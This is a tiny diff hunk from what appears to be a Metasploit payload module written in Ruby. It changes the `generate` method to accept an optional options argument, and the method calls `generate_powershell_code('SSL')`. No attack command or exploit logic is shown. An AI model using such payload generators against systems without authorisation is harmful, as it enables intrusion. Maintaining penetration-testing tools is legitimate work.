@@ -38,7 +38,7 @@ module MetasploitModule
     )
   end
 
-  def generate
+  def generate(_opts = {})
     generate_powershell_code('SSL')
   end
 end
